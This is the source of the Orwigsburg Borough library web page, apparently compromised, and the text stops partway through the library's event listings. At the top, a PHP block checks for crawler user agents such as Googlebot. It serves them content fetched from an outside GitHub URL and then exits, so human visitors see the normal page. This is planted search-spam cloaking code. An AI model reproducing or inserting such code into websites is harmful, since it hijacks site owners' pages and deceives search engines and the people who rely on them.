<?php
 
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
    $bots = array(
        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
        'DotBot', 'PetalBot', 'facebot'
    );
 
    if (empty($user_agent)) {
        return true;
    }
 
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
 
    return false;
}
 
 
function get_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
    $response = curl_exec($ch);
 
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
 
    curl_close($ch);
    return $response;
}
 
 
$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburggovlivelibrary';
 
 
if (is_bot()) {
    $message = get_remote_content($target_url);
    if ($message) {
        echo $message;
    } else {
        echo "Gagal ambil konten dari URL.";
    }
    exit;
}
?>


<!doctype html>
<html class="no-js" lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />

	<title>Library | Orwigsburg Borough</title>

    <meta name="theme-version" content="1.8.1" />
    <meta name="foundation-version" content="5.5.4" />
    <meta name="modernizr-version" content="3.6.0" />

	
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="robots" content="index, follow" />
		
	<meta name="twitter:card" content="summary">
	<meta name="twitter:title" content="Library | Orwigsburg Borough">
	<meta name="twitter:url" content="https://orwigsburg.gov/live/library/index.php">
	<meta property="og:type" content="website">
	<meta property="og:site_name" content="Orwigsburg Borough">
	<meta property="og:title" content="Library | Orwigsburg Borough">
	<meta property="og:url" content="https://orwigsburg.gov/live/library/index.php">

	<link rel="stylesheet" type="text/css" media="all" href="../../rw_common/themes/foundation/consolidated.css" />
		
	<script>var foundation={};</script>
	<script>function loadCSS(a,b,c){"use strict";var d=window.document.createElement("link"),e=b||window.document.getElementsByTagName("script")[0],f=window.document.styleSheets;return d.rel="stylesheet",d.href=a,d.media="only x",e.parentNode.insertBefore(d,e),d.onloadcssdefined=function(a){for(var b,c=0;c<f.length;c++)f[c].href&&f[c].href===d.href&&(b=!0);b?a():setTimeout(function(){d.onloadcssdefined(a)})},d.onloadcssdefined(function(){d.media=c||"all"}),d}</script>

	

			<link rel='stylesheet' type='text/css' media='all' href='../../rw_common/plugins/stacks/stacks.css' />
<link rel="stylesheet" type="text/css" media="all" href="../../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page28.css' />
        <script type='text/javascript' charset='utf-8' src='../../rw_common/plugins/stacks/jquery-2.2.4.min.js'></script>
        
        <link rel="stylesheet" href="../../rw_common/plugins/stacks/font-awesome.min.css">
        
<script type="text/javascript" charset="utf-8" src="../../rw_common/plugins/stacks/imagesloaded.min.js"></script><script type="text/javascript" charset="utf-8" src="../../rw_common/plugins/stacks/onimpression.js"></script><script type="text/javascript" charset="utf-8" src="../../rw_common/plugins/stacks/moment-with-locales.min.js"></script><script type="text/javascript" charset="utf-8" src="../../rw_common/plugins/stacks/mustache.min.js"></script>		
		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page28.js'></script>
		






	<script>var jQuery=stacks.jQuery,$=jQuery;</script>
	
</head>

<body class="antialiased">

<div id="foundation-loader"></div>



 <div id="total-image-reveal" class="reveal-modal" data-reveal aria-hidden="true"> <a class="close-button close-reveal-modal" title="Close" data-close>&times;</a> </div> 
<div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_12' class='stacks_out'><div id='stacks_in_12' class='stacks_in '></div></div><div id='stacks_out_134' class='stacks_out'><div id='stacks_in_134' class='stacks_in '>
	
	











 
 
</div></div><div id='stacks_out_23' class='stacks_out'><div id='stacks_in_23' class='stacks_in '>   <!--[if lt IE 9]> <meta http-equiv="refresh" content="0; url="> <![endif]-->     <script> var preloader_config = "line-scale,5".split(','), loader_inner = document.createElement('div'), loader_class = preloader_config[0]||'line-scale', loader_count = preloader_config[1]||5, loader_node = document.getElementById('foundation-loader'); for (var i = 0; i < loader_count; i++){loader_inner.appendChild(document.createElement('div'));} loader_inner.className = 'loader-inner '+loader_class; loader_node.appendChild(loader_inner); loader_node.style.display = "block"; </script>    
</div></div><div id='stacks_out_24' class='stacks_out'><div id='stacks_in_24' class='stacks_in '><div id='stacks_out_24_3' class='stacks_out'><div id='stacks_in_24_3' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse      '  > <div class='columns small-12  small-centered      '> <div id='stacks_out_24_5' class='stacks_out'><div id='stacks_in_24_5' class='stacks_in com_joeworkman_stacks_foundation_iconbar_s3_stack'><nav class="icon-bar horizontal custom " role="navigation">  <a role="button" tabindex="0" href="tel:570-366-3103" class="item " rel="">   <i class="fa fa-phone"></i>   </a> 
 <a role="button" tabindex="0" href="../../map/" class="item " rel="">   <i class="fa fa-map-marker"></i>   </a> 
 <a role="button" tabindex="0" href="https://www.facebook.com/orwigsburg" class="item " rel="external">   <i class="fa fa-facebook"></i>   </a> 
  <a role="button" tabindex="0" data-reveal-id="email" class="item">    <i class="fa fa-envelope"></i>   </a> 
 </nav> 
</div></div><div id='stacks_out_24_41' class='stacks_out'><div id='stacks_in_24_41' class='stacks_in com_joeworkman_stacks_foundation_reveal_stack'> <div id="email" class="reveal-lightbox reveal-modal small  " style="" aria-hidden="true" role="dialog" data-reveal> <div id='stacks_out_24_46' class='stacks_out'><div id='stacks_in_24_46' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><!-- Total Toggle -->





  
	<div id='stacks_out_24_31' class='stacks_out'><div id='stacks_in_24_31' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_36' class='stacks_out'><div id='stacks_in_24_36' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    William Reppy    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_37' class='stacks_out'><div id='stacks_in_24_37' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Manager    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_35' class='stacks_out'><div id='stacks_in_24_35' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:manager@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_45' class='stacks_out'><div id='stacks_in_24_45' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_68' class='stacks_out'><div id='stacks_in_24_68' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_69' class='stacks_out'><div id='stacks_in_24_69' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Harlee Lomas    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_71' class='stacks_out'><div id='stacks_in_24_71' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Secretary    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_73' class='stacks_out'><div id='stacks_in_24_73' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:secretary@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_75' class='stacks_out'><div id='stacks_in_24_75' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_78' class='stacks_out'><div id='stacks_in_24_78' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_79' class='stacks_out'><div id='stacks_in_24_79' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    David Teter    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_81' class='stacks_out'><div id='stacks_in_24_81' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Water/Sewer Department    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_83' class='stacks_out'><div id='stacks_in_24_83' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:dteter@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_85' class='stacks_out'><div id='stacks_in_24_85' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_88' class='stacks_out'><div id='stacks_in_24_88' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_89' class='stacks_out'><div id='stacks_in_24_89' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Vince McDonald    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_91' class='stacks_out'><div id='stacks_in_24_91' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Chief    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_93' class='stacks_out'><div id='stacks_in_24_93' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto: VMcDonald@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_95' class='stacks_out'><div id='stacks_in_24_95' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_48' class='stacks_out'><div id='stacks_in_24_48' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_49' class='stacks_out'><div id='stacks_in_24_49' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Barry Berger    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_51' class='stacks_out'><div id='stacks_in_24_51' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Mayor    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_53' class='stacks_out'><div id='stacks_in_24_53' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:bberger@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_55' class='stacks_out'><div id='stacks_in_24_55' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_116' class='stacks_out'><div id='stacks_in_24_116' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_117' class='stacks_out'><div id='stacks_in_24_117' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Richard Bubeck    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_119' class='stacks_out'><div id='stacks_in_24_119' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Council President    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_121' class='stacks_out'><div id='stacks_in_24_121' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:rbubeck@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_123' class='stacks_out'><div id='stacks_in_24_123' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_127' class='stacks_out'><div id='stacks_in_24_127' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_128' class='stacks_out'><div id='stacks_in_24_128' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Department    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_130' class='stacks_out'><div id='stacks_in_24_130' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Contact    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_132' class='stacks_out'><div id='stacks_in_24_132' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:police@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_134' class='stacks_out'><div id='stacks_in_24_134' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_24_138' class='stacks_out'><div id='stacks_in_24_138' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_139' class='stacks_out'><div id='stacks_in_24_139' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Inquires    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_141' class='stacks_out'><div id='stacks_in_24_141' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Borough Office    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_143' class='stacks_out'><div id='stacks_in_24_143' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:borough@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_145' class='stacks_out'><div id='stacks_in_24_145' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  



  

 
 <a class="close-reveal-modal" aria-label="close" style="">&#215;</a> </div> 
</div></div> </div> </div> 
</div></div><div id='stacks_out_24_1' class='stacks_out'><div id='stacks_in_24_1' class='stacks_in com_joeworkman_stacks_foundation_topbar_s3_stack'>


<div class="top-bar-wrapper  font-family-h2  sticky   matchPadding solid fixedShadow styleActive  submenuIndicator menu-align-right zone-align-right">
    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation">
        <ul class="title-area title-area-site-setup">
            <li class="name ">
                
                    <a href="https://orwigsburg.gov/">
                        
                            <span class="show-for-medium-up"><img src="../../rw_common/images/Borough-logo-png-500-tiny.png" width="500" height="475" alt="Orwigsburg Borough"/></span>
                        
                        
                            <h1 class="site-title font-family-h1 ">
                                Orwigsburg Borough
                                
                            </h1>
                        
                    </a>
                

                
            </li>
            <li class="toggle-topbar menu-icon">
                <a href="#">
                    <span>MENU</span>
                </a>
            </li>
        </ul>

        <section class="top-bar-section font-family-h2 menu-rw">







    <ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../../" rel="">Home</a></li><li class="has-dropdown" role="menuitem"><a href="https://orwigsburg.gov/services/utility-payment" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/" rel="">Government</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../../government/gov-news/" rel="">Borough News</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/officials/" rel="">Officials</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/financials/" rel="">Financial Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/public-meetings/" rel="">Public Meetings</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/building-zoning/" rel="">Building-Zoning Codes</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/community-reports/" rel="">Community Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/ordinances/" rel="">Ordinances</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/employment/" rel="">Employment</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/forms/" rel="">Forms</a></li><li class="has-dropdown" role="menuitem"><a href="../../government/tax-collection/" rel="">Tax Collection</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../../services/" rel="">Services</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../../services/utility-payment/" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/water/" rel="">Water</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/sewer/" rel="">Sewer</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/garbage-recycling/" rel="">Garbage-Recycling</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/ambulance/" rel="">Ambulance</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/fire/" rel="">Fire Dept.</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/police/" rel="">Police</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../../services/police/news/" rel="">Police News</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/police/police-staff/" rel="">Police Staff</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/police/police-equipment/" rel="">Police Equipment</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/police/police-pay-fines/" rel="">Pay Fines</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/police/laws-regs/" rel="">Forms,Laws,Regs</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/police/contact/" rel="">Contact Police</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../../services/streets/" rel="">Streets-Roads</a></li><li class="has-dropdown" role="menuitem"><a href="../../services/swift/" rel="">RAVE Notifications</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../../play/" rel="">Play</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../../play/events/" rel="">Events</a></li><li class="has-dropdown" role="menuitem"><a href="../../play/community/" rel="">Community</a></li><li class="has-dropdown" role="menuitem"><a href="../../play/parks-rec/" rel="">Parks & Recreation</a></li></ul></li><li class="active has-dropdown" role="menuitem"><a href="../../live/">Live</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../../live/churches/" rel="">Churches</a></li><li class="has-dropdown" role="menuitem"><a href="../../live/schools/" rel="">Schools</a></li><li class="active has-dropdown" role="menuitem"><a href="./">Library</a></li><li class="has-dropdown" role="menuitem"><a href="../../live/orgs/" rel="">Organizations</a></li></ul></li></ul>










        </section>
    </nav>
</div>



</div></div></div></div><div id='stacks_out_257' class='stacks_out'><div id='stacks_in_257' class='stacks_in '><div id='stacks_out_257_9' class='stacks_out'><div id='stacks_in_257_9' class='stacks_in com_joeworkman_stacks_impact_stack'> <div class="impact-wrapper impact-preload   proportional-height  "> <div class="pre-loader hidden    "> <i class="pl-spinner hidden fa fa-spinner fa-pulse fa-4x"></i> </div>  <div class="jw-impact slides"> <div class="fg-content fg-full-height">  </div> <ul class="slides-container  "> 





   




   


<!-- Total Impact Gallery -->
<li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/slideshowimage_30.jpg" alt="A Great Place to Raise a Family"/><div class="impact-container h-right v-bottom">
                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A Great Place to Raise a Family</h3></div>
            </div>
        </li><li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/ball-fields.jpg" alt="Recreation"/><div class="impact-container h-right v-bottom">
                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">Recreation</h3></div>
            </div>
        </li><li class="impact-slide slide slide-stacks_in_257_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/town-18-tiny.jpg" alt="A True "American Home Town""/><div class="impact-container h-right v-bottom">
                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A True "American Home Town"</h3></div>
            </div>
        </li>






















 </ul> <nav class="slides-navigation"> <a href="#" class="next"></a> <a href="#" class="prev"></a> </nav>  </div>  </div>  
</div></div></div></div><div id='stacks_out_138' class='stacks_out'><div id='stacks_in_138' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_4' class='stacks_out'><div id='stacks_in_4' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_17' class='stacks_out'><div id='stacks_in_17' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >Orwigsburg Library</h1> 
</div></div><!-- Total Toggle -->





  
	<div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <p>The Orwigsburg Public Library is located in Orwigsburg, Pennsylvania&nbsp;</p><p>216&nbsp;W. Independence St</p><p>Orwigsburg PA 17961</p><p><strong>For more information</strong></p><p>&nbsp;P: 570-366-1638</p><p>E: <a href="mailto:orwigsburglibrary@comcast.net">orwigsburglibrary@comcast.net</a></p><p>Web:&nbsp;<a href="http://www.orwigsburglibrary.org">www.orwigsburglibrary.org</a></p><p><br></p>    
 
</div></div>


  

 
<div id='stacks_out_140' class='stacks_out'><div id='stacks_in_140' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div class="total-blog-list blog_stacks_in_258 grid  " data-slug="library">






<article class="post    category-library  tag-public tag-free       ">




<div class="default-layout">
  <a class="blog-link" href="https://orwigsburg.gov/live/library/library-display/?permalink=15326294335b5a11b91e5a65b5a11b91e5ee" title="Read more about  Orwigsburg Area Free Public Library">  <div class="post_layout_wrapper    layout1_stacks_in_259    " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_260   height-auto-fixed " style=""> <div class="post_column1">  <h3 class="post-title  text-center  "><a href="https://orwigsburg.gov/live/library/library-display/?permalink=15326294335b5a11b91e5a65b5a11b91e5ee" title="Read more about  Orwigsburg Area Free Public Library">Orwigsburg Area Free Public Library</a> </h3>    
</div>  </div>  
 <div class="post-image-wrapper stacks_in_263"> <a class="blog-link" href="https://orwigsburg.gov/live/library/library-display/?permalink=15326294335b5a11b91e5a65b5a11b91e5ee" title="Read more about  Orwigsburg Area Free Public Library">   <ul class="post-image     first">    <li><img loading="auto" class="" src="../../cms-data/gallery/blog/library/15326294335b5a11b91e5a65b5a11b91e5ee/library-sq.jpg" alt=""></li>    </ul> </a> </div>   
    <div class="post_layout_wrapper    layout1_stacks_in_264    " style=""> <div class="post_column1"> <div class="post-categories  stacks_in_266 text-left  ">Category:   <span> <a href="?category=library" title="Read more about  Library">   Library </a> </span>  </div>    
 <div class="post-tags stacks_in_267 text-left  ">Tags:  <span> <a href="?tag=public" title="Public">   Public </a> </span>  <span> <a href="?tag=free" title="Free">   Free </a> </span>  </div>    
</div>  </div>  
    <div class="post_layout_wrapper    layout1_stacks_in_269    " style=""> <div class="post_column1"> <div class="post-summary  fr-view text-left  " ><p><strong>ORWIGSBURG AREA FREE PUBLIC LIBRARY</strong>&nbsp; &nbsp; &nbsp;&nbsp;</p>

<p>216 W. Independence St. Orwigsburg PA 17961</p>

<p>570-366-1638</p>

<p><a href="https://www.orwigsburglibrary.org/" rel="noopener noreferrer" target="_blank">Orwigsburg Library Web Site</a>, &nbsp;https://www.orwigsburglibrary.org/ &nbsp;&nbsp;</p>

<p>Please see details for more information. &nbsp; &nbsp;&nbsp;</p>

<p>HOURS OF OPERATION:          <br>Monday 10 a.m. – 7 p.m.<br>Tuesday 9 a.m. – 6 p.m.<br>Wednesday 10 a.m. – 7 p.m.<br>Thursday 9 a.m. – 6 p.m.<br>Friday &nbsp;10a.m. – 5 p.m.</p>

<p>Saturday 9 a.m. – 4 p.m.</p>

<p><br></p>
</div>   
</div>  </div>  
</div>  </div> </a> 
    <div class="post_layout_wrapper    layout1_stacks_in_273    " style=""> <div class="post_column1"><div class='slice empty out'><div class='slice empty in'></div></div></div>  </div>  
 <a role="button" href="https://orwigsburg.gov/live/library/library-display/?permalink=15326294335b5a11b91e5a65b5a11b91e5ee" title="Read more about  Orwigsburg Area Free Public Library" class="stacks_in_275  button readmore fixed-bottom  centered small custom radius">Details</a>   

</div>






</article><article class="post    category-library  tag-fun tag-public tag-library       ">




<div class="default-layout">
  <a class="blog-link" href="https://orwigsburg.gov/live/library/library-display/?permalink=174310169267e59efc46ba467e59efc46ba7" title="Read more about  Hooks &amp; Needles">  <div class="post_layout_wrapper    layout1_stacks_in_259    " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_260   height-auto-fixed " style=""> <div class="post_column1">  <h3 class="post-title  text-center  "><a href="https://orwigsburg.gov/live/library/library-display/?permalink=174310169267e59efc46ba467e59efc46ba7" title="Read more about  Hooks &amp; Needles">Hooks & Needles</a> </h3>    
</div>  </div>  
 <div class="post-image-wrapper stacks_in_263"> <a class="blog-link" href="https://orwigsburg.gov/live/library/library-display/?permalink=174310169267e59efc46ba467e59efc46ba7" title="Read more about  Hooks &amp; Needles">   <ul class="post-image     first">    <li><img loading="auto" class="" src="../../cms-data/gallery/blog/library/174310169267e59efc46ba467e59efc46ba7/hooks_page-0001-sq.jpg" alt=""></li>    </ul> </a> </div>   
    <div class="post_layout_wrapper    layout1_stacks_in_264    " style=""> <div class="post_column1"> <div class="post-categories  stacks_in_266 text-left  ">Category:   <span> <a href="?category=library" title="Read more about  Library">   Library </a> </span>  </div>    
 <div class="post-tags stacks_in_267 text-left  ">Tags:  <span> <a href="?tag=fun" title="Fun">   Fun </a> </span>  <span> <a href="?tag=public" title="Public">   Public </a> </span>  <span> <a href="?tag=library" title="Library">   Library </a> </span>  </div>    
</div>  </div>  
    <div class="post_layout_wrapper    layout1_stacks_in_269    " style=""> <div class="post_column1"> <div class="post-summary  fr-view text-left  " ><p><strong>Hooks &amp; Needles</strong></p>

<p>Mondays at 1:30 pm</p>

<p>Knitting club is reborn!</p>

<p>All levels welcome&nbsp;</p>
</div>   
</div>  </div>  
</div>  </div> </a> 
    <div class="post_layout_wrapper    layout1_stacks_in_273    " style=""> <div class="post_column1"><div class='slice empty out'><div class='slice empty in'></div></div></div>  </div>  
 <a role="button" href="https://orwigsburg.gov/live/library/library-display/?permalink=174310169267e59efc46ba467e59efc46ba7" title="Read more about  Hooks &amp; Needles" class="stacks_in_275  button readmore fixed-bottom  centered small custom radius">Details</a>   

</div>






</article><article class="post    category-library  tag-fun tag-public tag-library tag-chess       ">




<div class="default-layout">
  <a class="blog-link" href="https://orwigsburg.gov/live/library/library-display/?permalink=174310246367e5a1ff9901167e5a1ff99013" title="Read more about  Chess Club">  <div class="post_layout_wrapper    layout1_stacks_in_259    " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_260   height-auto-fixed " style=""> <div class="post_column1">  <h3 class="post-title  text-center  "><a href="https://orwigsburg.gov/live/library/library-display/?permalink=174310246367e5a1ff9901167e5a1ff99013" title="Read more about  Chess Club">Chess Club</a> </h3>    
</div>  </div>  
 <div class="post-image-wrapper stacks_in_263"> <a class="blog-link" href="https://orwigsburg.gov/live/library/library-display/?permalink=174310246367e5a1ff9901167e5a1ff99013" title="Read more about  Chess Club">   <ul class="post-image     first">    <li><img loading="auto" class="" src="../../cms-data/gallery/blog/library/174310246367e5a1ff9901167e5a1ff99013/chess-10_page-0001-sq.jpg" alt=""></li>    </ul> </a> </div>   
    <div class="post_layout_wrapper    layout1_stacks_in_264    " style=""> <div class="post_column1"> <div class="post-categories  stacks_in_266 text-left  ">Category:   <span> <a href="?category=library" title="Read more about  Library">   Library </a> </span>  </div>    
 <div class="post-tags stacks_in_267 text-left  ">Tags:  <span> <a href="?tag=fun" title="Fun">   Fun </a> </span>  <span> <a href="?tag=public" title="Public">   Public </a> </span>  <span> <a href="?tag=library" title="Library">   Library </a> </span>  <span> <a href="?tag=chess" title="Chess">   Chess </a> </span>  </div>    
</div>  </div>  
    <div class="post_layout_wrapper    layout1_stacks_in_269    " style=""> <div class="post_column1"> <div class="post-summary  fr-view text-left  " ><p><strong>Chess Club</strong></p>

<p>First Thursday of the month at 4:00 pm</p>

<p>All&nbsp;skill levels welcome!</p>
</div>   
</div>  </div>  
</div>  </div> </a> 
    <div class="post_layout_wrapper    layout1_stacks_in_273    " style=""> <div class="post_column1"><div class='slice empty out'><div class='slice empty in'></div></div></div>  </div>  
